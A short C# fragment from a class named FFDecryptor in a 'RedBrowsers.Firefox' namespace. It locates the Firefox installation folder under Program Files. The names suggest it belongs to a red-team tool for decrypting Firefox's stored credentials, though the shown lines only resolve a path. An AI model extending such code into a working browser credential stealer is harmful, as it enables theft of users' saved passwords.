...
namespace RedBrowsers.Firefox
{
    static class FFDecryptor
    {
        ...
        {
            string MozillaPath = "";
            string programFiles = Environment.ExpandEnvironmentVariables("%ProgramW6432%") + @"\Mozilla Firefox\";
            string programFilesX86 = Environment.ExpandEnvironmentVariables("%ProgramFiles(x86)%") + @"\Mozilla Firefox\";
            if (Directory.Exists(programFiles))
            {
                MozillaPath = programFiles;
            }
            else if (Directory.Exists(programFilesX86))
            {
                MozillaPath = programFilesX86;
            }
